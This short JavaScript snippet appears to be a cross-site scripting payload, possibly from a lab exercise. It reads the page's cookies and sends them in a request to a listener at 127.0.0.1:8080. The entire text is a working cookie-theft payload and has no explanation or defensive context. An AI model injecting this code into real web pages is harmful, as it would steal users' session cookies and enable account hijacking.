var cookieValue = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1:8080?q=" + encodeURIComponent(cookieValue), true);
xhr.send();
